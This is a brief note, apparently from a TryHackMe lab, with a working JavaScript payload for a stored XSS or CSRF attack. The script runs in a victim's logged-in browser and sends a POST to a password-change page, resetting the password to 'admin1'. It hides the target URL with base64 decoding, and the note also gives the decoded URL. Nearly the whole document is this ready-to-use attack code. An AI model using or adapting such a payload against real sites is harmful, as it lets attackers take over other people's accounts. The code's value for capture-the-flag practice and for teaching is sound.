JavaScript payload that sends an authenticated password-reset request from the victim’s browser session.



```atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw')``` Base64 encode otherwise ```'http://login.worldwap.thm/change_password.php'```


courtesy of tryhackme:
```
<script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                alert("Action executed!");
            }
        };
        xhr.send('action=execute&new_password=admin1');
    </script>
```
